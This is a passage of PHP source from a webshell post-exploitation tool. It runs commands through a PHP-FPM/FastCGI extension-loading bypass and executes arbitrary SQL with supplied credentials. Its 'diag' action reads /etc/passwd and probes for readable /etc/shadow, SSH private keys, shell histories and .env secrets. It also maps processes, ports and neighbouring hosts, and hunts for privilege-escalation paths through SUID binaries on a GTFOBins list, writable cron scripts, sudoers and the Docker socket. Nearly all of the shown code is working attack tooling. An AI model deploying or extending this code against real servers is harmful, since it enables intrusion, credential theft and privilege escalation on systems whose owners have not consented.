            // header block (Content-type, cache headers) — header lines are
            // Capitalized-Word: value, body lines like uid= are not
            $output = preg_replace('/PHP message: PHP [A-Za-z]+:[^\r\n]*/', '', $output);
            $output = preg_replace('/^(?:[A-Z][A-Za-z0-9-]*:[^\r\n]*\r?\n)+\r?\n/', '', $output);
            // Self-healing retry: FPM's per-worker ini caching can apply a
            // request's directives in an order that loads the module but
            // drops the arming (observed on workers carrying state from
            // older exploit sessions). One retry with the complementary ini
            // set deterministically recovers — after a load attempt the
            // module is present (arm-only suffices); after an arm-only
            // attempt on a probe false-negative, a full load is the cure.
            if (strpos($output, 'NOT armed') !== false) {
                if ($SO_TMP === null) {   // arm-only was tried — stage for the full-load retry
                    $SO_TMP = sys_get_temp_dir() . '/sx_ext_' . bin2hex(random_bytes(6)) . '.so';
                    if (!copy($so, $SO_TMP)) $SO_TMP = null;
                }
                $retryIni = ($def['ext'] && $SO_TMP !== null)
                    ? ['extension_dir = ' . dirname($SO_TMP), 'extension = ' . basename($SO_TMP), 'poc_ext.armed = 1']
                    : ['poc_ext.armed = 1'];
                $output = bp_talk($s, bp_inner_params('ext', $retryIni, true, $b64));
                $output = preg_replace('/PHP message: PHP [A-Za-z]+:[^\r\n]*/', '', $output);
                $output = preg_replace('/^(?:[A-Z][A-Za-z0-9-]*:[^\r\n]*\r?\n)+\r?\n/', '', $output);
            }
            if ($SO_TMP !== null) @unlink($SO_TMP);   // unlinking a mapped .so is safe on Linux
            if (strpos($output, 'NOT available') !== false || strpos($output, 'NOT armed') !== false || trim($output) === '') {
                $err = trim($output) !== '' ? trim($output) : 'extension produced no output';
                bp_cleanup($s, $def['sm'], $def['df'], $def['ed']);
                fclose($s);
                echo json_encode(['available' => false, 'error' => $err]);
                exit;
            }
            $method = 'fcgi-ext';
        }

        $cl = bp_cleanup($s, $def['sm'], $def['df'], $def['ed']);
        fclose($s);

        // extract new cwd from output (same technique as shell.php)
        $newCwd = $cwd;
        if (preg_match('/' . preg_quote($marker, '/') . ':(.+)$/m', $output, $m)) {
            $newCwd = trim($m[1]);
            $output = preg_replace('/' . preg_quote($marker, '/') . ':(.+)\n?$/', '', $output);
        }
        $truncated = false;
        if (strlen($output) > $maxOutput) { $output = substr($output, 0, $maxOutput); $truncated = true; }
        $result = [
            'output' => rtrim($output),
            'cwd' => $newCwd,
            'method' => $method,
            'available' => true,
            'cleanup_verified' => strpos($cl, 'inner[cleanup]:') !== false,
        ];
        if ($truncated) $result['truncated'] = true;
        echo json_encode($result);
        exit;
    }

    echo json_encode(['ok' => false, 'error' => 'unknown mode']);
    exit;
}
// ==================== SQL PROBE ====================
if (isset($_POST['action']) && $_POST['action'] === 'sql_probe') {
    if (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json');
    echo json_encode([
        'mysqli'    => extension_loaded('mysqli'),
        'pdo_mysql' => extension_loaded('pdo_mysql'),
        'pdo_pgsql' => extension_loaded('pdo_pgsql'),
    ]);
    exit;
}

// ==================== SQL QUERY ====================
if (isset($_POST['action']) && $_POST['action'] === 'sql_query') {
    if (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json');

    $host     = trim($_POST['host']      ?? '127.0.0.1');
    $port     = (int) ($_POST['port']    ?? 3306);
    $db       = trim($_POST['db']        ?? '');
    $user     = trim($_POST['user']      ?? '');
    $password = $_POST['password']       ?? '';
    $driver   = trim($_POST['driver']    ?? 'mysql');
    $query    = trim($_POST['query']     ?? '');
    $timeout  = (int) ($_POST['timeout'] ?? 30);

    set_time_limit($timeout > 0 ? $timeout : 30);

    if ($query === '') {
        echo json_encode(['error' => 'Empty query']);
        exit;
    }

    $maxRows = 500;
    $conn    = null;
    $method  = '';

    // DSN components are concatenated into PDO connection strings — strip
    // DSN metacharacters so a host/db like "x;unix_socket=/" can't smuggle
    // extra parameters into the string. mysqli passes them as separate
    // arguments and needs no such scrubbing.
    $dsnSafe = function ($s) { return preg_replace('/[;=\s]/', '', $s); };
    $host = $dsnSafe($host);
    $db   = $dsnSafe($db);
    if ($port < 1 || $port > 65535) $port = $driver === 'pgsql' ? 5432 : 3306;
    if ($host === '') $host = '127.0.0.1';

    // ---- Connect ----
    if ($driver === 'pgsql') {
        if (!extension_loaded('pdo_pgsql')) {
            echo json_encode(['error' => 'pdo_pgsql extension not available']);
            exit;
        }
        try {
            $dsn  = 'pgsql:host=' . $host . ';port=' . $port . ';dbname=' . $db;
            $conn = new PDO($dsn, $user, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
            $method = 'pdo_pgsql';
        } catch (Exception $e) {
            echo json_encode(['error' => 'Connection failed: ' . $e->getMessage()]);
            exit;
        }
    } else {
        // MySQL: prefer mysqli, fall back to pdo_mysql
        if (extension_loaded('mysqli')) {
            mysqli_report(MYSQLI_REPORT_OFF);
            $m = @new mysqli($host, $user, $password, $db, $port);
            if (!$m->connect_error) {
                $conn   = $m;
                $method = 'mysqli';
            }
        }
        if (!$conn && extension_loaded('pdo_mysql')) {
            try {
                $dsn  = 'mysql:host=' . $host . ';port=' . $port . ';dbname=' . $db . ';charset=utf8mb4';
                $conn = new PDO($dsn, $user, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
                $method = 'pdo_mysql';
            } catch (Exception $e) {
                echo json_encode(['error' => 'Connection failed: ' . $e->getMessage()]);
                exit;
            }
        }
        if (!$conn) {
            echo json_encode(['error' => 'Connection failed: no mysqli/pdo_mysql extension or wrong credentials']);
            exit;
        }
    }

    // ---- Execute ----
    try {
        if ($method === 'mysqli') {
            $res = $conn->query($query);
            if ($res === false) {
                $err = $conn->error;
                $conn->close();
                echo json_encode(['error' => $err]);
                exit;
            }
            if ($res === true) {
                $affected = $conn->affected_rows;
                $conn->close();
                echo json_encode(['affected' => $affected]);
                exit;
            }
            // Result set (SELECT / SHOW / DESCRIBE etc.)
            $fields  = $res->fetch_fields();
            $columns = [];
            foreach ($fields as $f) $columns[] = $f->name;
            $rows      = [];
            $truncated = false;
            while ($row = $res->fetch_row()) {
                $safe = [];
                foreach ($row as $v) $safe[] = $v === null ? 'NULL' : (string) $v;
                $rows[] = $safe;
                if (count($rows) >= $maxRows) { $truncated = true; break; }
            }
            $res->free();
            $conn->close();
            $out = ['columns' => $columns, 'rows' => $rows, 'count' => count($rows)];
            if ($truncated) $out['truncated'] = true;
            echo json_encode($out);
        } else {
            // PDO (pdo_mysql or pdo_pgsql)
            $stmt = $conn->query($query);
            $colCount = $stmt->columnCount();
            if ($colCount > 0) {
                $columns = [];
                for ($i = 0; $i < $colCount; $i++) {
                    $meta      = $stmt->getColumnMeta($i);
                    $columns[] = isset($meta['name']) ? $meta['name'] : 'col' . $i;
                }
                $rows      = [];
                $truncated = false;
                while ($row = $stmt->fetch(PDO::FETCH_NUM)) {
                    $safe = [];
                    foreach ($row as $v) $safe[] = $v === null ? 'NULL' : (string) $v;
                    $rows[] = $safe;
                    if (count($rows) >= $maxRows) { $truncated = true; break; }
                }
                $out = ['columns' => $columns, 'rows' => $rows, 'count' => count($rows)];
                if ($truncated) $out['truncated'] = true;
                echo json_encode($out);
            } else {
                echo json_encode(['affected' => $stmt->rowCount()]);
            }
        }
    } catch (Exception $e) {
        echo json_encode(['error' => $e->getMessage()]);
    }
    exit;
}
if (!function_exists('shells_x_realpath')) {
    require_once __DIR__ . '/helpers.php';
}
// On-demand session file reader used by the Diagnostics UI. Returns JSON
// with file contents (truncated) only if the path is a regular file and
// lies under the resolved session.save_path or the webshell working dir.
if (isset($_POST['action']) && $_POST['action'] === 'read_session_file') {
    header('Content-Type: application/json');
    
    $path = $_POST['path'] ?? '';
    if (!is_string($path) || $path === '') {
        echo json_encode(['error' => 'missing path']);
        exit;
    }

    $realResult = shells_x_validate_readable_file($path);
    if (isset($realResult['error'])) {
        echo json_encode(['error' => $realResult['error']]);
        exit;
    }
    $real = $realResult['path'];

    $sessRaw = ini_get('session.save_path') ?: '';
    $sessResult = shells_x_parse_session_save_path($sessRaw);
    $rootResult = shells_x_realpath(getcwd() ?: '.');
    $allowedRoots = [];
    if (!isset($sessResult['error']))
        $allowedRoots[] = $sessResult['path'];
    if (!isset($rootResult['error']))
        $allowedRoots[] = $rootResult['path'];
    if (!shells_x_is_path_allowed($real, $allowedRoots)) {
        echo json_encode(['error' => 'forbidden']);
        exit;
    }

    $fileResult = shells_x_read_file_truncated($real, 20000);
    if (isset($fileResult['error'])) {
        echo json_encode(['error' => $fileResult['error']]);
        exit;
    }

    echo json_encode(['path' => $real, 'content' => $fileResult['content'], 'truncated' => $fileResult['truncated']]);
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'diag') {
    // crypto.php stacks [encryption, sacrificial] because generated shells
    // always require --password. Pop only the sacrificial layer — same contract
    // as eval.php. Popping the encryption buffer leaks raw JSON; WAFs may wrap
    // that as <!-- base64 --> and crypto.js cannot decrypt it.
    if (ob_get_level() > 0) {
        ob_end_clean();
    }
    $__diag_obl = ob_get_level();
    header('Content-Type: application/json');

    // Fatal error handler — catch 500s and return JSON instead of blank page
    register_shutdown_function(function () use ($__diag_obl) {
        $err = error_get_last();
        if ($err && in_array($err['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
            while (ob_get_level() > $__diag_obl)
                ob_end_clean();
            if (!headers_sent())
                header('Content-Type: application/json');
            echo json_encode(['error' => 'Fatal: ' . $err['message'] . ' in ' . $err['file'] . ':' . $err['line']]);
        }
    });

    // --- PHP / server basics ---
    $dangerous = ['exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open', 'pcntl_exec', 'pcntl_fork', 'mail', 'mb_send_mail', 'putenv', 'imap_open', 'dl', 'error_log', 'expect_popen', 'ob_start', 'fsockopen', 'stream_socket_client'];
    $funcs = [];
    foreach ($dangerous as $f)
        $funcs[$f] = function_exists($f);
    $funcs['FFI'] = class_exists('FFI');
    $exts = ['FFI', 'imap', 'sockets', 'posix', 'pcntl', 'openssl', 'sqlite3', 'phar', 'zip'];
    $extList = [];
    foreach ($exts as $e)
        $extList[$e] = extension_loaded($e);

    // --- Current process identity ---
    $uid = function_exists('posix_getuid') ? posix_getuid() : null;
    $gid = function_exists('posix_getgid') ? posix_getgid() : null;
    $pwent = function_exists('posix_getpwuid') ? @posix_getpwuid($uid) : false;
    $grent = function_exists('posix_getgrgid') ? @posix_getgrgid($gid) : false;
    $groups = function_exists('posix_getgroups') ? (@posix_getgroups() ?: []) : [];
    $groupNames = [];
    foreach ($groups as $g) {
        $gi = function_exists('posix_getgrgid') ? @posix_getgrgid($g) : false;
        if ($gi)
            $groupNames[] = $gi['name'] . '(' . $g . ')';
    }

    // --- /etc/passwd users with login shells ---
    $passwdUsers = [];
    $passwdRaw = @file_get_contents('/etc/passwd') ?: '';
    foreach (explode("\n", $passwdRaw) as $line) {
        $p = explode(':', $line);
        if (count($p) >= 7 && !in_array($p[6], ['/usr/sbin/nologin', '/bin/false', '/sbin/nologin', ''])) {
            $passwdUsers[] = ['user' => $p[0], 'uid' => $p[2], 'gid' => $p[3], 'home' => $p[5], 'shell' => $p[6]];
        }
    }

    // --- /etc/group membership ---
    $groupsRaw = @file_get_contents('/etc/group') ?: '';
    $interestingGroups = ['sudo', 'wheel', 'lxd', 'docker', 'adm', 'shadow', 'disk'];
    $groupMemberships = [];
    foreach (explode("\n", $groupsRaw) as $line) {
        $p = explode(':', $line);
        if (count($p) >= 4 && in_array($p[0], $interestingGroups) && trim($p[3]) !== '') {
            $groupMemberships[$p[0]] = array_filter(explode(',', $p[3]));
        }
    }

    // --- Running processes ---
    $processes = [];
    foreach (@glob('/proc/[0-9]*') ?: [] as $pidDir) {
        $cmd = @file_get_contents($pidDir . '/cmdline');
        $stat = @file_get_contents($pidDir . '/status');
        if (!$cmd)
            continue;
        $cmd = str_replace("\0", ' ', trim($cmd));
        $uid_proc = null;
        if (preg_match('/^Uid:\s+(\d+)/m', $stat, $m))
            $uid_proc = (int) $m[1];
        $processes[] = ['pid' => basename($pidDir), 'uid' => $uid_proc, 'cmd' => substr($cmd, 0, 120)];
    }

    // --- Container detection ---
    $container = ['detected' => false, 'type' => null, 'hints' => []];
    if (@file_exists('/.dockerenv')) {
        $container = ['detected' => true, 'type' => 'docker', 'hints' => ['/.dockerenv exists']];
    } elseif (@file_exists('/run/.containerenv')) {
        $container = ['detected' => true, 'type' => 'podman', 'hints' => ['/run/.containerenv exists']];
    } else {
        $cgroup = @file_get_contents('/proc/1/cgroup') ?: '';
        if (preg_match('/(docker|kubepods|containerd|lxc|ecs)/', $cgroup, $cm)) {
            $container = ['detected' => true, 'type' => $cm[1], 'hints' => ['cgroup: ' . $cm[1]]];
        }
        $sched = @file_get_contents('/proc/1/sched');
        if ($sched && !preg_match('/^\s*(init|systemd)\s/m', $sched)) {
            $container['hints'][] = 'PID 1 is not init/systemd';
            $container['detected'] = true;
        }
    }

    // Helper: split raw text into lines, optionally skipping a header row.
    $__lines = function ($raw, $skipHeader = false) {
        $lines = explode("\n", $raw);
        if ($skipHeader && count($lines) > 0)
            array_shift($lines);
        return $lines;
    };

    // --- Network: ARP table ---
    // /proc/net/arp columns: IP Address, HW type, Flags, HW address, Mask, Device.
    // Flags 0x0 = incomplete entry (kernel sent ARP request but got no reply) —
    // the IP / MAC pair is garbage. We also drop the all-zeros MAC and the
    // "<incomplete>" literal that older kernels emit, so the export doesn't
    // create phantom Faraday hosts from failed ARP probes.
    $arpRaw = @file_get_contents('/proc/net/arp') ?: '';
    $arpHosts = [];
    foreach ($__lines($arpRaw, true) as $line) {
        $parts = preg_split('/\s+/', trim($line));
        if (count($parts) < 4 || $parts[0] === '')
            continue;
        $flags = $parts[2] ?? '';
        $mac = $parts[3] ?? '';
        if ($flags === '0x0')
            continue;                       // incomplete ARP entry
        if ($mac === '' || $mac === '<incomplete>' || $mac === '00:00:00:00:00:00')
            continue;
        $arpHosts[] = ['ip' => $parts[0], 'mac' => $mac, 'dev' => $parts[5] ?? ''];
    }

    // --- Network: open ports (TCP) with process correlation ---
// Build inode→pid map via readlink if available, else fall back to UID matching
    $inodePid = [];
    $pidCmd = [];
    foreach ($processes as $proc) {
        $pidCmd[$proc['pid']] = $proc['cmd'];
    }
    if (function_exists('readlink')) {
        foreach (@glob('/proc/[0-9]*') ?: [] as $pidDir) {
            $pid = basename($pidDir);
            $fdDir = $pidDir . '/fd';
            foreach (@scandir($fdDir) ?: [] as $fd) {
                if ($fd === '.' || $fd === '..')
                    continue;
                $link = @readlink($fdDir . '/' . $fd);
                if ($link && preg_match('/^socket:\[(\d+)\]$/', $link, $m)) {
                    $inodePid[$m[1]] = $pid;
                }
            }
        }
    }
    // Decode bind address + port from /proc/net/tcp lines for both IPv4 and IPv6.
    // We expose the bind address so the export can distinguish a network-reachable
    // listener (0.0.0.0:80) from a loopback-only one (127.0.0.1:9000) instead of
    // dumping every PHP-FPM / Redis local socket into the Faraday Services view.
    $openPortRaw = [];
    foreach (['/proc/net/tcp' => 4, '/proc/net/tcp6' => 6] as $tcpFile => $ipv) {
        $tcpRaw = @file_get_contents($tcpFile) ?: '';
        foreach ($__lines($tcpRaw, true) as $line) {
            $parts = preg_split('/\s+/', trim($line));
            if (count($parts) < 10 || $parts[3] !== '0A')
                continue;
            $hex = explode(':', $parts[1]);
            if (!isset($hex[1]))
                continue;
            $port = hexdec($hex[1]);
            $addrHex = $hex[0];
            $localAddr = '?';
            if ($ipv === 4 && strlen($addrHex) === 8) {
                $bin = @hex2bin($addrHex);
                if ($bin !== false && strlen($bin) === 4) {
                    $u = @unpack('V', $bin);
                    if ($u) $localAddr = long2ip($u[1]);
                }
            } elseif ($ipv === 6 && strlen($addrHex) === 32) {
                $bin = '';
                for ($i = 0; $i < 4; $i++) {
                    $grp = @hex2bin(substr($addrHex, $i * 8, 8));
                    if ($grp === false) { $bin = false; break; }
                    $bin .= strrev($grp);
                }
                if ($bin !== false && strlen($bin) === 16) {
                    $localAddr = @inet_ntop($bin) ?: '?';
                }
            }
            $inode = $parts[9];
            $sockUid = isset($parts[7]) ? (int) $parts[7] : null;
            $pid = isset($inodePid[$inode]) ? $inodePid[$inode] : null;
            $cmd = ($pid !== null && isset($pidCmd[$pid])) ? $pidCmd[$pid] : null;
            // Loopback = bound only to localhost interface (not 0.0.0.0 which
            // listens on ALL interfaces). 0.0.0.0 / :: are network-reachable.
            // Also catch IPv4-mapped IPv6 loopback (::ffff:127.x.x.x) which some
            // stacks emit when a service binds to 127.0.0.1 via the IPv6 socket.
            $loopback = (bool) preg_match('/^127\./', $localAddr)
                || $localAddr === '::1'
                || (bool) preg_match('/^::ffff:127\./i', $localAddr);
            $openPortRaw[] = ['port' => $port, 'proto' => $ipv === 6 ? 'tcp6' : 'tcp', 'local_addr' => $localAddr, 'loopback' => $loopback, 'pid' => $pid, 'cmd' => $cmd, 'uid' => $sockUid];
        }
    }
    // Dedup per port preferring network-reachable bindings over loopback-only.
    // Previously we kept whichever entry came first, which silently dropped a
    // 0.0.0.0:9000 binding if 127.0.0.1:9000 happened to appear earlier in tcp6.
    $portsByNum = [];
    foreach ($openPortRaw as $e) {
        if (!isset($portsByNum[$e['port']]) || ($portsByNum[$e['port']]['loopback'] && !$e['loopback'])) {
            $portsByNum[$e['port']] = $e;
        }
    }
    $openPorts = array_values($portsByNum);
    usort($openPorts, function ($a, $b) {
        return $a['port'] - $b['port']; });

    // --- Network: routing table ---
    $routeRaw = @file_get_contents('/proc/net/route') ?: '';
    $routes = [];
    $routeSeen = [];
    foreach ($__lines($routeRaw, true) as $line) {
        $p = preg_split('/\s+/', trim($line));
        if (count($p) >= 8 && $p[1] !== '') {
            $dest = long2ip(hexdec(strrev(hex2bin(str_pad($p[1], 8, '0', STR_PAD_LEFT)))));
            $gw = long2ip(hexdec(strrev(hex2bin(str_pad($p[2], 8, '0', STR_PAD_LEFT)))));
            $mask = long2ip(hexdec(strrev(hex2bin(str_pad($p[7], 8, '0', STR_PAD_LEFT)))));
            $metric = isset($p[6]) ? (int) $p[6] : 0;
            $key = $p[0] . '|' . $dest . '|' . $gw . '|' . $mask;
            if (isset($routeSeen[$key]))
                continue;
            $routeSeen[$key] = true;
            $routes[] = ['iface' => $p[0], 'dest' => $dest, 'gw' => $gw, 'mask' => $mask, 'metric' => $metric];
        }
    }

    // --- Network: local interfaces + upstream host hints ---
    // ARP only lists L2 neighbors already contacted. Interface addresses and
    // gateway / host.docker.internal / REMOTE_ADDR belong here instead.
    $ifaceAddrs = [];
    if (function_exists('net_get_interfaces')) {
        foreach (@net_get_interfaces() ?: [] as $iface => $info) {
            if ($iface === 'lo' || empty($info['unicast']))
                continue;
            foreach ($info['unicast'] as $u) {
                if (($u['family'] ?? null) !== 2 || empty($u['address']))
                    continue;
                $mac = trim(@file_get_contents('/sys/class/net/' . $iface . '/address') ?: '');
                $ifaceAddrs[] = [
                    'iface' => $iface,
                    'ip' => $u['address'],
                    'netmask' => $u['netmask'] ?? '',
                    'mac' => $mac,
                ];
            }
        }
    }
    $defaultGateway = '';
    foreach ($routes as $r) {
        if ($r['dest'] === '0.0.0.0' && $r['gw'] !== '0.0.0.0') {
            $defaultGateway = $r['gw'];
            break;
        }
    }
    $bindIp = $_SERVER['SERVER_ADDR'] ?? '';
    if (($bindIp === '' || $bindIp === '0.0.0.0') && function_exists('socket_create')) {
        $s = @socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
        if ($s) {
            $probe = ($defaultGateway !== '' && $defaultGateway !== '0.0.0.0')
                ? $defaultGateway : '8.8.8.8';
            if (@socket_connect($s, $probe, 1)) {
                @socket_getsockname($s, $bindIp);
            }
            @socket_close($s);
        }
    }
    // IPs outside this container namespace (gateway, Docker host alias, HTTP client).
    // Shown in diagnostics separately from ARP; not a full network inventory.
    $upstreamHosts = [];
    if ($defaultGateway !== '' && $defaultGateway !== '0.0.0.0') {
        $upstreamHosts[] = [
            'ip' => $defaultGateway,
            'source' => 'default_gateway',
            'note' => 'Default route gateway (Docker bridge / toward host)',
        ];
    }
    // Docker injects this hostname so containers can reach the machine running Docker.
    // gethostbyname() returns the hostname unchanged when DNS has no record — skip then.
    $hostDocker = @gethostbyname('host.docker.internal');
    if ($hostDocker && $hostDocker !== 'host.docker.internal') {
        $upstreamHosts[] = [
            'ip' => $hostDocker,
            'source' => 'host.docker.internal',
            'note' => 'Resolved Docker host alias (reach laptop/VM from container)',
        ];
    }
    $clientIp = $_SERVER['REMOTE_ADDR'] ?? '';
    if ($clientIp !== '') {
        $upstreamHosts[] = [
            'ip' => $clientIp,
            'source' => 'remote_addr',
            'note' => 'Client IP for this HTTP request',
        ];
    }

    // --- Interesting readable files (expanded) ---
    $sensitiveFiles = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/sudoers',
        '/root/.ssh/id_rsa',
        '/root/.ssh/id_ed25519',
        '/root/.ssh/id_ecdsa',
        '/root/.ssh/authorized_keys',
        '/root/.ssh/known_hosts',
        '/root/.bash_history',
        '/home/*/.ssh/id_rsa',
        '/home/*/.ssh/id_ed25519',
        '/home/*/.ssh/id_ecdsa',
        '/home/*/.ssh/authorized_keys',
        '/home/*/.bash_history',
        '/home/*/.zsh_history',
        '/etc/ssh/ssh_host_rsa_key',
        '/etc/ssh/ssh_host_ed25519_key',
        '/etc/ssh/ssh_host_ecdsa_key',
        '/root/.my.cnf',
        '/home/*/.my.cnf',
        '/etc/mysql/debian.cnf',
        '/root/.pgpass',
        '/home/*/.pgpass',
        '/.env',
        getcwd() . '/.env',
        getcwd() . '/../.env',
    ];
    $readable = [];
    foreach ($sensitiveFiles as $pattern) {
        foreach (@glob($pattern) ?: [$pattern] as $f) {
            if (@is_readable($f))
                $readable[] = $f;
        }
    }

    // --- Binary directories ---
    $binDirs = [];
    foreach (['/bin', '/sbin', '/usr/bin', '/usr/sbin', '/usr/local/bin', '/usr/local/sbin', '/usr/lib', '/usr/libexec', '/snap/bin'] as $d) {
        if (@is_dir($d))
            $binDirs[] = ['path' => $d, 'readable' => @is_readable($d), 'writable' => @is_writable($d)];
    }

    // --- Writable directories ---
    $writableDirs = [];
    foreach (['/tmp', '/var/tmp', '/dev/shm', '/run/shm', getcwd(), '/var/www', '/www/wwwroot'] as $d) {
        if (@is_writable($d))
            $writableDirs[] = $d;
    }

    // --- Scan all binaries from bin dirs, then classify ---
    $knownInterpreters = ['python3', 'python', 'perl', 'ruby', 'php', 'bash', 'sh', 'node', 'lua', 'tclsh'];
    $knownTools = ['nc', 'ncat', 'curl', 'wget', 'gcc', 'cc', 'make', 'git', 'nmap', 'socat', 'ssh', 'scp', 'rsync', 'tar', 'zip', 'unzip'];
    $allBinaries = [];
    $availInterpreters = [];
    $availTools = [];
    foreach ($binDirs as $info) {
        if (!$info['readable'])
            continue;
        foreach (@scandir($info['path']) ?: [] as $entry) {
            if ($entry === '.' || $entry === '..')
                continue;
            $full = $info['path'] . '/' . $entry;
            if (!@is_file($full))
                continue;
            $allBinaries[] = $full;
            if (in_array($entry, $knownInterpreters))
                $availInterpreters[] = $full;
            if (in_array($entry, $knownTools))
                $availTools[] = $full;
        }
    }

    // =====================================================
// PRIVILEGE ESCALATION CHECKS
// =====================================================

    // --- 1. SUID/SGID binaries ---
    $gtfobinsNames = ['ar', 'aria2c', 'ash', 'awk', 'base32', 'base64', 'bash', 'bridge', 'busybox', 'bzip2', 'cancel', 'capsh', 'cat', 'chmod', 'chown', 'column', 'comm', 'cp', 'cpan', 'cpulimit', 'crontab', 'csh', 'curl', 'cut', 'dash', 'date', 'dd', 'dialog', 'diff', 'dig', 'dmesg', 'dmsetup', 'docker', 'dpkg', 'easy_install', 'ed', 'emacs', 'env', 'eqn', 'expand', 'expect', 'facter', 'file', 'find', 'finger', 'flock', 'fmt', 'fold', 'ftp', 'gawk', 'gcc', 'gdb', 'gem', 'gimp', 'git', 'grep', 'gtester', 'gzip', 'hd', 'head', 'hexdump', 'highlight', 'iconv', 'iftop', 'install', 'ionice', 'ip', 'irb', 'jjs', 'journalctl', 'jq', 'jrunscript', 'ksh', 'ksshell', 'knife', 'ld', 'ldconfig', 'less', 'logsave', 'look', 'ltrace', 'lua', 'lwp-download', 'lwp-request', 'mail', 'make', 'man', 'mawk', 'more', 'mount', 'mtr', 'mv', 'mysql', 'nano', 'nasm', 'nawk', 'nc', 'nft', 'nice', 'nl', 'nmap', 'node', 'nohup', 'npm', 'nroff', 'nsenter', 'od', 'openssl', 'openvpn', 'paste', 'perf', 'perl', 'pg', 'php', 'pic', 'pico', 'pip', 'pkexec', 'pry', 'python', 'python2', 'python3', 'rake', 'readelf', 'red', 'rlogin', 'rlwrap', 'rpm', 'rpmquery', 'rsync', 'ruby', 'run-mailcap', 'run-parts', 'rvim', 'scp', 'screen', 'script', 'sed', 'service', 'setarch', 'sftp', 'sh', 'shuf', 'smbclient', 'socat', 'sort', 'sqlite3', 'ss', 'ssh', 'start-stop-daemon', 'stdbuf', 'strace', 'strings', 'su', 'sysctl', 'tail', 'tar', 'taskset', 'tbl', 'tclsh', 'tee', 'telnet', 'tftp', 'time', 'timeout', 'tmux', 'top', 'ul', 'unexpand', 'uniq', 'unshare', 'vi', 'vim', 'watch', 'wc', 'wget', 'whois', 'wish', 'xargs', 'xxd', 'xz', 'yarn', 'zip', 'zsh', 'zsoelim'];
    $gtfobinsMap = array_flip($gtfobinsNames);
    $suidBinaries = [];
    // Scan already-enumerated binaries + extra SUID-heavy dirs
    $extraSuidDirs = ['/usr/lib/dbus-1.0', '/usr/lib/openssh', '/usr/lib/policykit-1', '/usr/lib/eject', '/usr/lib/xorg', '/usr/lib/snapd'];
    $suidScanPaths = $allBinaries;
    foreach ($extraSuidDirs as $d) {
        if (!@is_readable($d))
            continue;
        foreach (@scandir($d) ?: [] as $entry) {
            if ($entry === '.' || $entry === '..')
                continue;
            $full = $d . '/' . $entry;
            if (@is_file($full))
                $suidScanPaths[] = $full;
        }
    }
    foreach ($suidScanPaths as $bin) {
        $perms = @fileperms($bin);
        if ($perms === false)
            continue;
        $isSuid = (bool) ($perms & 0x800);
        $isSgid = (bool) ($perms & 0x400);
        if (!$isSuid && !$isSgid)
            continue;
        $st = @stat($bin);
        $ownerUid = $st ? $st['uid'] : null;
        $bn = basename($bin);
        $suidBinaries[] = [
            'path' => $bin,
            'owner_uid' => $ownerUid,
            'suid' => $isSuid,
            'sgid' => $isSgid,
            'gtfobins' => isset($gtfobinsMap[$bn]),
        ];
    }

    // --- 2. Cron jobs ---
    $cronJobs = [];
    $cronPaths = ['/etc/crontab', '/etc/anacrontab'];
    foreach (@glob('/etc/cron.d/*') ?: [] as $f) {
        if (@is_file($f))
            $cronPaths[] = $f;
    }
    foreach (@glob('/var/spool/cron/crontabs/*') ?: [] as $f) {
        if (@is_file($f))
            $cronPaths[] = $f;
    }
    foreach (@glob('/var/spool/cron/*') ?: [] as $f) {
        if (@is_file($f) && basename($f) !== 'crontabs')
            $cronPaths[] = $f;
    }
    foreach ($cronPaths as $cf) {
        $content = @file_get_contents($cf, false, null, 0, 8192);
        if ($content === false)
            continue;
        $wrScripts = [];
        // Extract command paths from cron lines (skip comments, blank, variables)
        foreach (explode("\n", $content) as $cl) {
            $cl = trim($cl);
            if ($cl === '' || $cl[0] === '#' || strpos($cl, '=') !== false)
                continue;
            // Cron format: min hour dom mon dow [user] command
            if (preg_match('/(?:^[@*0-9][\S]*\s+){5,6}(\/.+)/', $cl, $cm)) {
                $cmdPath = preg_split('/\s+/', trim($cm[1]))[0];
                if ($cmdPath && @is_writable($cmdPath))
                    $wrScripts[] = $cmdPath;
            }
        }
        $cronJobs[] = ['source' => $cf, 'source_writable' => @is_writable($cf), 'content' => $content, 'writable_scripts' => $wrScripts];
    }

    // --- 3. Sudo configuration ---
    $sudoConfig = ['readable' => false, 'files' => []];
    if (@is_readable('/etc/sudoers')) {
        $sudoConfig['readable'] = true;
        $sc = @file_get_contents('/etc/sudoers', false, null, 0, 8192);
        if ($sc !== false)
            $sudoConfig['files']['/etc/sudoers'] = $sc;
    }
    foreach (@glob('/etc/sudoers.d/*') ?: [] as $sf) {
        $sc = @file_get_contents($sf, false, null, 0, 8192);
        if ($sc !== false) {
            $sudoConfig['readable'] = true;
            $sudoConfig['files'][$sf] = $sc;
        }
    }

    // --- 4. Docker/Podman socket ---
    $dockerSocket = ['sockets' => [], 'user_in_docker_group' => isset($groupMemberships['docker'])];
    foreach (['/var/run/docker.sock', '/run/docker.sock', '/var/run/podman/podman.sock', '/run/podman/podman.sock'] as $sock) {
        if (@file_exists($sock)) {
            $dockerSocket['sockets'][] = ['path' => $sock, 'exists' => true, 'readable' => @is_readable($sock), 'writable' => @is_writable($sock)];
        }
    }

    // --- 5. Mount points & flags ---
    $mounts = [];
    $mountsRaw = @file_get_contents('/proc/self/mounts') ?: (@file_get_contents('/proc/mounts') ?: '');
    foreach (explode("\n", $mountsRaw) as $line) {
        $p = preg_split('/\s+/', trim($line));
        if (count($p) < 4)
            continue;
        $opts = $p[3];
        $mounts[] = [
            'device' => $p[0],
            'mountpoint' => $p[1],
            'fstype' => $p[2],
            'options' => $opts,
            'nosuid' => strpos($opts, 'nosuid') !== false,
            'noexec' => strpos($opts, 'noexec') !== false,
            'writable' => strpos($opts, 'rw') === 0 || strpos($opts, ',rw') !== false,
        ];
    }

    // --- 6. Linux capabilities (current process) ---
